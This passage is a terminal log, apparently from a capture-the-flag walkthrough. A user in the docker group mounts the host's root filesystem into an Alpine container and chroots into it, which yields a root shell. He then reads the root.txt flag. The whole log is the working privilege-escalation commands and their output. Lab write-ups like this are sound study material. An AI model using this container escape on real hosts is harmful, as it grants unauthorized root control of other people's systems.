REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    c059bfaa849c   4 years ago   5.59MB
(remote) randy@ephemeral:/home/randy$ 
(remote) randy@ephemeral:/home/randy$ docker run -it --rm \
>   -v /:/mnt \
>   alpine chroot /mnt /bin/bash

groups: cannot find name for group ID 4
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@8d424afcf40b:/# 
root@8d424afcf40b:/# ls
bin    home    lost+found    proc  srv       var
boot   lib     media         root  swapfile
cdrom  lib32   mnt           run   sys
dev    lib64   opt           sbin  tmp
etc    libx32  private_html  snap  usr
root@8d424afcf40b:/# cd root
root@8d424afcf40b:~# ls
root.txt  snap
root@8d424afcf40b:~# cat root.txt 
8e77a69cc53f51e6f2a03e7e2d9c2219
```





